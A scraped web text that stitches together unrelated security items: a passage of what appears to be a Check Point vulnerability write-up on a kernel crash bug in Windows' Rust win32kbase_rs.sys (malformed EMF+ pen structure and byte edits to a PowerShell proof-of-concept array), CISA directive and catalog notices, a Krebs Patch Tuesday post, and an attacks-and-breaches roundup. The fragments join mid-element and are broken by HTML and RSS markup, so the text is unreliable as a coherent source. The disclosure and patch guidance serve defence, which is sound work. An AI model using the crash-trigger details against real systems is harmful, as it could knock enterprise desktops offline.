&lt;p&gt;The following is the relevant excerpt of the&amp;nbsp;&lt;code&gt;EmfPlusObject&lt;/code&gt;&amp;nbsp;that specifies the pen to use. If&amp;nbsp;&lt;code&gt;PenDataStartCap&lt;/code&gt;&amp;nbsp;is set, the style of a starting line cap is specified in the&amp;nbsp;&lt;code&gt;OptionalData&lt;/code&gt;&amp;nbsp;field of an&amp;nbsp;&lt;code&gt;EmfPlusPenData&lt;/code&gt;&amp;nbsp;object. Similarly,&amp;nbsp;&lt;code&gt;PenDataNonCenter&lt;/code&gt;&amp;nbsp;indicates whether a pen alignment is specified in the&amp;nbsp;&lt;code&gt;OptionalData&lt;/code&gt;&amp;nbsp;field of an&amp;nbsp;&lt;code&gt;EmfPlusPenData&lt;/code&gt;&amp;nbsp;object.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;EmfPlusObject pen = {
    .Type                 = 0x4008,     // EmfPlusObject
    .Flags                = 0x0200,     // EmfPlusPen
    .Size                 = 0x00000030,
    .DazaSize             = 0x00000024,
    .ObjectData = {
        .Version          = 0xDBC01002, // EMF+
        .Type             = 0x42200000, // PenDataNonCenter, PenDataStartCap
        .PenDataFlags     = 0x00000202, // UnitTypeInch
        .PenUnit          = 0x00000004,
        .PenWidth         = 0xFFFFFFEE,
        .OptionalData = {
            .StartCap     = 0x0000FC05,
            .PenAlignment = 0x0051E541
        }
    }
};
&lt;/pre&gt;

&lt;p&gt;The following structure shows the&amp;nbsp;&lt;code&gt;EmfPlusDrawBeziers&lt;/code&gt;&amp;nbsp;record that triggered the vulnerability. It contains values produced through mutation, including 17 points, despite declaring a nominal count of only 4, which is ignored during processing. This mismatch, along with the coordinate data, appears sufficient to stress the path parsing logic and expose this edge-case behavior in the kernel.&lt;/p&gt;

&lt;p&gt;Additional analysis indicates that the bounds check fails specifically when a&amp;nbsp;&lt;code&gt;Metafile&lt;/code&gt;&amp;nbsp;object is passed to&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/dotnet/api/system.drawing.graphics.fromimage"&gt;&lt;code&gt;Graphics::FromImage()&lt;/code&gt;&lt;/a&gt;&amp;nbsp;to create a&amp;nbsp;&lt;code&gt;Graphics&lt;/code&gt;&amp;nbsp;object, despite the method being documented to accept only&amp;nbsp;&lt;code&gt;Image&lt;/code&gt;&amp;nbsp;objects intended for drawing, such as&amp;nbsp;&lt;code&gt;Bitmap&lt;/code&gt;. This misuse enables execution to reach the vulnerable code path. The resulting&amp;nbsp;&lt;code&gt;BugCheck&lt;/code&gt;&amp;nbsp;can be triggered by invoking the&amp;nbsp;&lt;code&gt;DrawImage()&lt;/code&gt;&amp;nbsp;method on the&amp;nbsp;&lt;code&gt;Graphics&lt;/code&gt;&amp;nbsp;object created from the&amp;nbsp;&lt;code&gt;Metafile&lt;/code&gt;. The following PowerShell script embeds a metafile in the&amp;nbsp;&lt;code&gt;$b&lt;/code&gt;&amp;nbsp;variable containing a specially crafted&amp;nbsp;&lt;code&gt;EmfPlusDrawBeziers&lt;/code&gt;&amp;nbsp;record with malformed edge data. This approach works from low integrity within a standard user session and affects both x86 and x64 systems, as the vulnerable routine resides in the&amp;nbsp;&lt;code&gt;win32kbase_rs.sys&lt;/code&gt;&amp;nbsp;driver.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Listing 5.&lt;/em&gt;&amp;nbsp;Proof-of-concept PowerShell script for reproducing the vulnerability.&lt;/p&gt;



&lt;p&gt;The shown proof-of-concept metafile can only trigger the crash when the edge block reaching the kernel produces a specific path geometry. Below are three independent record-level edits that would prevent that layout from forming, so the buggy code path is not executed:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Flip the&amp;nbsp;&lt;code&gt;C/P&lt;/code&gt;&amp;nbsp;flags so the&amp;nbsp;&lt;code&gt;PointData&lt;/code&gt;&amp;nbsp;field is read as an array of&amp;nbsp;&lt;code&gt;EmfPlusPointF&lt;/code&gt;&amp;nbsp;objects:&lt;br /&gt;&lt;code&gt;$b[0x15f]=0;&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;Increase the&amp;nbsp;&lt;code&gt;Size&lt;/code&gt;&amp;nbsp;to add an extra flat point:&lt;br /&gt;&lt;code&gt;$b[0x160]=84;$b=$b[0..351]+(0,0,0,0)+$b[352..($b.Length-1)];&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;Decrease the&amp;nbsp;&lt;code&gt;DataSize&lt;/code&gt;&amp;nbsp;to&amp;nbsp;&lt;code&gt;64&lt;/code&gt;&amp;nbsp;to drop the last point:&lt;br /&gt;&lt;code&gt;$b[0x164]=64;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;This issue is mitigated by the fact that the vulnerable&amp;nbsp;&lt;code&gt;win32kbase_rs.sys&lt;/code&gt;&amp;nbsp;component is not present on Windows Server versions. We reported this vulnerability to Microsoft, but MSRC classified it as&amp;nbsp;&lt;em&gt;Moderate&lt;/em&gt;&amp;nbsp;severity, stating that it does not warrant immediate servicing. However, they fixed the vulnerability as part of a feature update few weeks after the&amp;nbsp;&lt;em&gt;May 2025 Patch Tuesday&lt;/em&gt;. According to their assessment:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;“the Rust code correctly catches an out-of-bounds array access and triggers a panic, resulting in a Blue Screen of Death (BSOD), as expected”&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;However, the observed behavior aligns with the broader definition of a vulnerability. Triggering a&amp;nbsp;&lt;em&gt;BSOD&lt;/em&gt;&amp;nbsp;through a user-space function that processes user-controlled input should be regarded as a vulnerability necessitating a security fix. A failed security check should not lead to a system crash.&lt;/p&gt;



&lt;p&gt;More importantly, as confirmed by the MSRC, a threat actor could exploit this flaw by creating malicious metafiles designed to crash targeted systems when the metafile is displayed. Such disruptions could render enterprise environments temporarily inoperable, leading to unexpected downtime and interfering with key business processes. In addition, there may be data loss or corruption as well.&lt;/p&gt;



&lt;p&gt;Imagine a scenario where an attacker obtains credentials for a low-privileged domain user who can log in to all systems across the entire enterprise. With a bit of scripting magic, they could easily crash every Windows desktop late on a Friday afternoon, early Monday morning or at a chosen time that would be most detrimental to the business.&lt;/p&gt;

&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="how-microsoft-fixed-the-vulnerability"&gt;&lt;strong&gt;How Microsoft fixed the vulnerability&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Microsoft determined that this was a moderate-severity denial-of-service issue and therefore chose to address it in a non-security update. According to Microsoft, the fix was first shipped with&amp;nbsp;&lt;a href="https://support.microsoft.com/en-us/topic/may-28-2025-kb5058499-os-build-26100-4202-preview-d4c2f1ee-8138-4038-b705-546945076f92"&gt;KB5058499&lt;/a&gt;&amp;nbsp;in version&amp;nbsp;&lt;a href="https://msdl.microsoft.com/download/symbols/win32kbase_rs.sys/8EB39C6F29000/win32kbase_rs.sys"&gt;10.0.26100.4202&lt;/a&gt;&amp;nbsp;of the&amp;nbsp;&lt;code&gt;win32kbase_rs.sys&lt;/code&gt;&amp;nbsp;kernel module, released on May 28, 2025, and reached full global release status by the end of the week of June 23. Notably, version 4202 introduced a significant update to the module, reflected in a file size increase from 148 KB to 164 KB, suggesting substantial internal changes likely related to the vulnerability fix. One of the most heavily modified components in this update is the&amp;nbsp;&lt;code&gt;region_from_path_mut()&lt;/code&gt;&amp;nbsp;function, which underwent some restructuring.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32011" height="550" src="https://research.checkpoint.com/wp-content/uploads/2025/10/BAUF67CFQB-image5-1024x550.png" width="1024" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;em&gt;Figure 5.&lt;/em&gt;&amp;nbsp;Visualization of function-level differences showing modifications in the&amp;nbsp;&lt;code&gt;region_from_path_mut()&lt;/code&gt;&amp;nbsp;function.&lt;/p&gt;



&lt;p&gt;Among its most notable changes is the introduction of two distinct edge-handling routines:&amp;nbsp;&lt;code&gt;add_edge_original()&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;add_edge_new()&lt;/code&gt;. The&amp;nbsp;&lt;code&gt;GlobalEdgeTable::add_edge()&lt;/code&gt;&amp;nbsp;function, which converts two vertices into an edge record and inserts it into the in-memory edge table, now exists in these two forms. Microsoft retained the original logic as&amp;nbsp;&lt;code&gt;add_edge_original()&lt;/code&gt;&amp;nbsp;and implemented a new, bounds-hardened version called&amp;nbsp;&lt;code&gt;add_edge_new()&lt;/code&gt;. While both implementations produce the same functional output, the new version addresses several corner cases and potential memory-handling issues present in the legacy routine.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32012" height="1024" src="https://research.checkpoint.com/wp-content/uploads/2025/10/BAUF67CFQB-image6-744x1024.png" width="744" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;em&gt;Figure 6.&lt;/em&gt;&amp;nbsp;Decompiled source code of the&amp;nbsp;&lt;code&gt;region_from_path_mut()&lt;/code&gt;&amp;nbsp;function showing the&amp;nbsp;&lt;code&gt;add_edge_new()&lt;/code&gt;&amp;nbsp;function.&lt;/p&gt;



&lt;p&gt;A feature flag,&amp;nbsp;&lt;code&gt;Feature_Servicing_Win32kRSPathToRegion_IsEnabled()&lt;/code&gt;, determines at runtime which version is invoked. Although the fix was already present in the codebase, we found during our initial testing that this feature flag was disabled. We were only able to confirm the presence of the fix in the debugger, and we could only verify the fix later in production following the&amp;nbsp;&lt;em&gt;July 2025 Patch Tuesday&lt;/em&gt;.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;We discovered a security vulnerability in the recently shipped Rust code of the Windows graphics component that could have serious implications for system security. While the adoption of Rust in the Windows kernel marks a significant step forward for security and reliability, it is important to recognize that software engineering challenges cannot be overcome by language choice alone. Rust offers strong guarantees around memory safety and type correctness, helping prevent entire classes of bugs such as buffer overflows and invalid pointer dereferences. However, rigorous security testing and thoughtful software design remain essential, as issues can still arise.&lt;/p&gt;



&lt;p&gt;In the case of implementing&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/gdi/regions"&gt;GDI region&lt;/a&gt;&amp;nbsp;and related functions in Rust, a failed security check triggered a deliberate kernel panic, also known as&amp;nbsp;&lt;em&gt;Blue Screen of Death (BSOD)&lt;/em&gt;. Although this crash was originally intended as a safety mechanism, for example, as an emergency stop when something goes wrong, this highlights a larger concern. A fitting analogy might be a home alarm system that stops a burglar by blowing up the house. While the threat is technically neutralized, the collateral damage is far too costly.&lt;/p&gt;



&lt;p&gt;We should aim for security solutions that protect without risking system-wide failure. It is also worth bearing in mind that these issues are not unique to Rust but can happen in any other software project as well. Therefore, while it is encouraging to see this step to rewrite a critical part of the operating system using memory-safe language, this example must also serve as a reminder of the difficulties involved and the necessity of using extremely thorough engineering standards and principles. Even rigorous standards will not guarantee smooth sailing. We should still anticipate encountering unexpected bugs and vulnerabilities.&lt;/p&gt;



&lt;p&gt;Our finding may constitute the first publicly disclosed security issue involving a Rust-based kernel component following Rust’s integration into the Windows kernel. Shortly thereafter, we identified a vulnerability that could allow attackers to crash Windows 11 version 24H2 using a specially crafted metafile, as demonstrated by a one-liner proof-of-concept PowerShell script. The question remains whether we will continue to see more bugs like this in the kernel.&lt;/p&gt;

&lt;p&gt;This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&amp;nbsp;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;KEV Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

&lt;p&gt;A nation-state affiliated cyber threat actor has compromised F5 systems and exfiltrated data, including portions of the BIG-IP proprietary source code and vulnerability information, which provides the actor with a technical advantage to exploit F5 devices and software. This poses an imminent threat to federal networks using F5 devices and software.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Key Actions Required:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Inventory:&lt;/strong&gt; Identify all instances of F5 BIG-IP hardware devices and F5OS, BIG-IP TMOS, Virtual Edition, BIG-IP Next, BIG-IP IQ software, and BNK / CNF.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Harden Public-Facing Hardware and Software Appliances:&lt;/strong&gt; Identify if physical or virtual BIG-IP devices exposed to the public internet provide public access to the networked management interface.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Update Instances of BIG-IP Hardware and Software Applications:&lt;/strong&gt; Apply the &lt;a href="https://my.f5.com/manage/s/article/K000156572" title="latest vendor updates"&gt;latest vendor updates&lt;/a&gt; by Oct. 22, 2025, for the following products: F5OS, BIG-IP TMOS, BIG-IQ, and BNK / CNF— validate the F5 published MD5 checksums for its software image files and other F5 downloaded software. For other devices, update with the latest software release by Oct. 31, 2025, and apply the latest F5-provided asset hardening guidance.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disconnect End of Support Devices:&lt;/strong&gt; Disconnect all public-facing F5 devices that have reached their end-of-support date. Report mission-critical exceptions to CISA.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mitigate Against Cookie Leakage:&lt;/strong&gt; If CISA notifies an agency of a BIG-IP cookie leakage vulnerability, the agency shall follow CISA’s accompanying mitigation instructions.&lt;/li&gt;

October&amp;#8217;s Patch Tuesday also marks the final month that Microsoft will ship security updates for &lt;strong&gt;Windows 10&lt;/strong&gt; systems. If you&amp;#8217;re running a Windows 10 PC and you&amp;#8217;re unable or unwilling to migrate to&lt;strong&gt; Windows 11&lt;/strong&gt;, read on for other options.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-52647" height="549" src="https://krebsonsecurity.com/wp-content/uploads/2020/08/windowsec.png" width="748" /&gt;&lt;/p&gt;
&lt;p&gt;The first zero-day bug addressed this month (&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-24990" rel="noopener" target="_blank"&gt;CVE-2025-24990&lt;/a&gt;) involves a third-party modem driver called Agere Modem that&amp;#8217;s been bundled with Windows for the past two decades. Microsoft responded to active attacks on this flaw by completely removing the vulnerable driver from Windows.&lt;/p&gt;
&lt;p&gt;The other zero-day is &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-59230" rel="noopener" target="_blank"&gt;CVE-2025-59230&lt;/a&gt;, an elevation of privilege vulnerability in &lt;strong&gt;Windows Remote Access Connection Manager&lt;/strong&gt; (also known as &lt;strong&gt;RasMan&lt;/strong&gt;), a service used to manage remote network connections through virtual private networks (VPNs) and dial-up networks.&lt;/p&gt;
&lt;p&gt;&amp;#8220;While RasMan is a frequent flyer on Patch Tuesday, appearing more than 20 times since January 2022, this is the first time we&amp;#8217;ve seen it exploited in the wild as a zero day,&amp;#8221; said &lt;strong&gt;Satnam Narang&lt;/strong&gt;, senior staff research engineer at &lt;strong&gt;Tenable&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Narang notes that &lt;strong&gt;Microsoft Office&lt;/strong&gt; users should also take note of &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-59227" rel="noopener" target="_blank"&gt;CVE-2025-59227&lt;/a&gt; and &lt;a href="http://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-59234" rel="noopener" target="_blank"&gt;CVE-2025-59234&lt;/a&gt;, a pair of remote code execution bugs that take advantage of &amp;#8220;Preview Pane,” meaning that the target doesn’t even need to open the file for exploitation to occur. To execute these flaws, an attacker would social engineer a target into previewing an email with a malicious Microsoft Office document.&lt;/p&gt;
&lt;p&gt;Speaking of Office, Microsoft &lt;a href="https://www.windowscentral.com/microsoft/microsoft-office/microsoft-is-making-word-automatically-save-new-documents-to-onedrive-by-default" rel="noopener" target="_blank"&gt;quietly announced this week&lt;/a&gt; that &lt;strong&gt;Microsoft Word&lt;/strong&gt; will now automatically save documents to OneDrive, Microsoft&amp;#8217;s cloud platform. Users who are uncomfortable saving all of their documents to Microsoft&amp;#8217;s cloud can change this in Word&amp;#8217;s settings; ZDNet has &lt;a href="https://www.zdnet.com/article/microsoft-word-forcing-you-to-save-new-files-to-the-cloud-heres-how-to-stop-it/" rel="noopener" target="_blank"&gt;a useful how-to&lt;/a&gt; on disabling this feature.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kev Breen&lt;/strong&gt;, senior director of threat research at &lt;strong&gt;Immersive&lt;/strong&gt;, called attention to &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287" rel="noopener" target="_blank"&gt;CVE-2025-59287&lt;/a&gt;, a critical remote code execution bug in the Windows Server Update Service  (WSUS) &amp;#8212; the very same Windows service responsible for downloading security patches for Windows Server versions. Microsoft says there are no signs this weakness is being exploited yet. But with a threat score of 9.8 out of possible 10 and marked &amp;#8220;exploitation more likely,&amp;#8221; CVE-2025-59287 can be exploited without authentication and is an easy &amp;#8220;patch now&amp;#8221; candidate.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Microsoft provides limited information, stating that an unauthenticated attacker with network access can send untrusted data to the WSUS server, resulting in deserialization and code execution,&amp;#8221; Breen wrote. &amp;#8220;As WSUS is a trusted Windows service that is designed to update privileged files across the file system, an attacker would have free rein over the operating system and could potentially bypass some EDR detections that ignore or exclude the WSUS service.&amp;#8221;&lt;/p&gt;
&lt;p&gt;For more on other fixes from Redmond today, check out the &lt;strong&gt;SANS Internet Storm Center&lt;/strong&gt; &lt;a href="https://isc.sans.edu/forums/diary/Microsoft%20Patch%20Tuesday%20October%202025/32368/" rel="noopener" target="_blank"&gt;monthly roundup&lt;/a&gt;, which indexes all of the updates by severity and urgency.&lt;/p&gt;
&lt;p&gt;Windows 10 isn&amp;#8217;t the only Microsoft OS that is reaching end-of-life today; &lt;strong&gt;Exchange Server 2016&lt;/strong&gt;, &lt;strong&gt;Exchange Server 2019&lt;/strong&gt;, &lt;strong&gt;Skype for Business 2016&lt;/strong&gt;, &lt;strong&gt;Windows 11 IoT Enterprise Version 22H2&lt;/strong&gt;, and &lt;strong&gt;Outlook 2016&lt;/strong&gt; are some of the other products that Microsoft is sunsetting today.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-72385" height="474" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/win10pcrequirements.png" width="747" /&gt;&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re running any Windows 10 systems, you&amp;#8217;ve probably already determined whether your PC meets the technical hardware specs recommended for the Windows 11 OS. If you&amp;#8217;re reluctant or unable to migrate a Windows 10 system to Windows 11, there are alternatives to simply continuing to use Windows 10 without ongoing security updates.&lt;span id="more-72318"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;One option is to pay for another year&amp;#8217;s worth of security updates through &lt;a href="https://www.microsoft.com/en-ie/windows/extended-security-updates?r=1" rel="noopener" target="_blank"&gt;Microsoft&amp;#8217;s Extended Security Updates&lt;/a&gt; (ESU) program. The cost is just $30 if you don&amp;#8217;t have a Microsoft account, and apparently free if you register the PC to a Microsoft account. This &lt;a href="https://www.youtube.com/watch?v=SZH7MlvOoPM" rel="noopener" target="_blank"&gt;video breakdown&lt;/a&gt; from &lt;strong&gt;Ask Your Computer Guy&lt;/strong&gt; does a good job of walking Windows 10 users through this process. Microsoft emphasizes that ESU enrollment does not provide other types of fixes, feature improvements or product enhancements. It also does not come with technical support.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72386" style="width: 756px;"&gt;&lt;img alt="" class=" wp-image-72386" height="436" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/esu-winupdate.png" width="746" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72386"&gt;If your Windows 10 system is associated with a Microsoft account and signed in when you visit Windows Update, you should see an option to enroll in extended updates. Image: https://www.youtube.com/watch?v=SZH7MlvOoPM&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Windows 10 users also have the option of installing some flavor of Linux instead. Anyone seriously considering this option should check out the website &lt;a href="https://endof10.org/" rel="noopener" target="_blank"&gt;endof10.org&lt;/a&gt;, which includes a plethora of tips and a DIY installation guide.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linux Mint &lt;/strong&gt;is a great option for Linux newbies. Like most modern Linux versions, Mint will run on anything with a 64-bit CPU that has at least 2GB of memory, although 4GB is recommended. In other words, it will run on almost any computer produced in the last decade.&lt;/p&gt;
&lt;p&gt;Linux Mint also is likely to be the most intuitive interface for regular Windows users, and it is largely configurable without any fuss at the text-only command-line prompt. Mint and other flavors of Linux come with &lt;strong&gt;LibreOffice&lt;/strong&gt;, which is an open source suite of tools that includes applications similar to Microsoft Office, and it can open, edit and save documents as Microsoft Office files.&lt;/p&gt;
&lt;p&gt;If you’d prefer to give Linux a test drive before installing it on a Windows PC, you can always just download it to a removable USB drive. From there, reboot the computer (with the removable drive plugged in) and select the option at startup to run the operating system from the external USB drive. If you don’t see an option for that after restarting, try restarting again and hitting the F8 button, which should open a list of bootable drives. &lt;a href="https://www.youtube.com/watch?v=_qZI6i21jB4" rel="noopener" target="_blank"&gt;Here’s a fairly thorough tutorial&lt;/a&gt; that walks through exactly how to do all this.&lt;/p&gt;
&lt;p&gt;And if this is your first time trying out Linux, relax and have fun: The nice thing about a “live” version of Linux (as it’s called when the operating system is run from a removable drive such as a CD or a USB stick) is that none of your changes persist after a reboot. Even if you somehow manage to break something, a restart will return the system back to its original state.&lt;/p&gt;
&lt;p&gt;As ever, if you experience any difficulties during or after applying this month&amp;#8217;s batch of patches, please leave a note about it in the comments below.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=72318</guid><category>Time to Patch</category><category>CVE-2025-24990</category><category>CVE-2025-59227</category><category>CVE-2025-59230</category><category>CVE-2025-59234</category><category>CVE-2025-59287</category><category>Immersive</category><category>Kev Breen</category><category>Microsoft Office</category><category>Microsoft Patch Tuesday October 2025</category><category>Satnam Narang</category><category>Tenable</category></item><item><title>CISA Adds Five Known Exploited Vulnerabilities to Catalog</title><link>https://www.cisa.gov/news-events/alerts/2025/10/14/cisa-adds-five-known-exploited-vulnerabilities-catalog</link><description>&lt;div class="OutlineElement Ltr SCXW12170402 BCX8"&gt;
&lt;p&gt;&lt;strong&gt;Updated October 22, 2025&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="OutlineElement Ltr SCXW12170402 BCX8"&gt;
&lt;p&gt;&lt;em&gt;CISA is continually collaborating with partners across government and the private sector. Through this collaboration, CISA has determined that CVE-2025-6264 has not been exploited and there is insufficient evidence to keep this CVE on the KEV and that the best course of action is to remove it. CISA is committed to continued collaboration with partners.&lt;/em&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="OutlineElement Ltr SCXW12170402 BCX8"&gt;
&lt;p&gt;&lt;strong&gt;End of Update&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;CISA has added five new vulnerabilities to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities (KEV) Catalog"&gt;Known Exploited Vulnerabilities (KEV) Catalog&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&amp;nbsp;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="KEV Catalog vulnerabilities"&gt;KEV Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/24081</guid></item><item><title>CISA Releases One Industrial Control Systems Advisory</title><link>https://www.cisa.gov/news-events/alerts/2025/10/14/cisa-releases-one-industrial-control-systems-advisory</link><description>&lt;p&gt;CISA released one Industrial Control Systems (ICS) advisory on October 14, 2025.

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Qilin ransomware group has &lt;a href="https://www.japantimes.co.jp/business/2025/10/08/companies/asahi-group-cyberattack-gang/"&gt;claimed&lt;/a&gt; responsibility for targeting Asahi, Japan’s largest brewing company, that had been hacked on September 29&lt;sup&gt;th&lt;/sup&gt;. The attack resulted in the exfiltration of over 9,300 files totaling 27GB of sensitive data, including financial documents, employee IDs, contracts, and internal reports. The attack disrupted operations at six breweries, impacting the production of thirty labels and potentially causing hundreds of millions in losses.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Threat Emulation provides protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Wins.Qilin)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sugar Land city in Texas has &lt;a href="https://therecord.media/houston-suburb-cyberattack-services"&gt;been&lt;/a&gt; a victim of a cyber-attack that resulted in outages to several online municipal services, including bill pay, permit payments, and utility billing systems, but did not affect critical infrastructure or emergency services. The incident impacted the digital access of nearly 110,000 residents, exposing service interruptions but with no disclosed evidence of data theft.&lt;/li&gt;
&lt;li&gt;American law firm Williams &amp;amp; Connolly has &lt;a href="https://therecord.media/us-law-firm-hackers-breached-email"&gt;confirmed&lt;/a&gt; a cyber attack that resulted in unauthorized access to email accounts belonging to a small number of attorneys. The firm reported no evidence that confidential client data was stolen from central databases, and the scope of the compromised information appears limited to email accounts. The attack has been attributed to suspected China affiliated threat actors.&lt;/li&gt;
&lt;li&gt;Crimson Collective threat group, who claimed the Red Hat intrusion last week, is now &lt;a href="https://www.rapid7.com/blog/post/tr-crimson-collective-a-new-threat-group-observed-operating-in-the-cloud/"&gt;targeting&lt;/a&gt; AWS environments for data theft and extortion. The group harvests exposed AWS credentials, creates new IAM users and access keys, assigns AdministratorAccess for privilege escalation and enumerates cloud assets. Afterwards, the group resets RDS master passwords and snapshots EBS volumes to spin up EC2 instances under permissive security groups, then delivers extortion notes through SES from within AWS victim accounts. Post-disclosure, Crimson Collective partnered with “Scattered Lapsus$ Hunters” to amplify pressure and has reused IPs across incidents, aiding cross-case correlation.&lt;/li&gt;
&lt;li&gt;Electronic components maker Avnet has &lt;a href="https://www.bleepingcomputer.com/news/security/electronics-giant-avnet-confirms-breach-says-stolen-data-unreadable/"&gt;suffered&lt;/a&gt; a data breach that resulted in unauthorized access to an externally hosted EMEA internal-sales database. A threat actor has claimed responsibility for stealing 1.3TB of compressed data and demanding ransom, but most data is reportedly unreadable without proprietary tools, and the total number of affected individuals remains unknown.&lt;/li&gt;
&lt;li&gt;American gambling company DraftKings has &lt;a href="https://www.securityweek.com/draftkings-warns-users-of-credential-stuffing-attacks/"&gt;experienced&lt;/a&gt; a data breach that resulted in unauthorized access to customer accounts through credential stuffing attacks, exposing personal information such as names, phone numbers, email addresses, last four digits of payment cards and more. The breach has reportedly impacted fewer than 30 customers, and no sensitive data was accessed.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
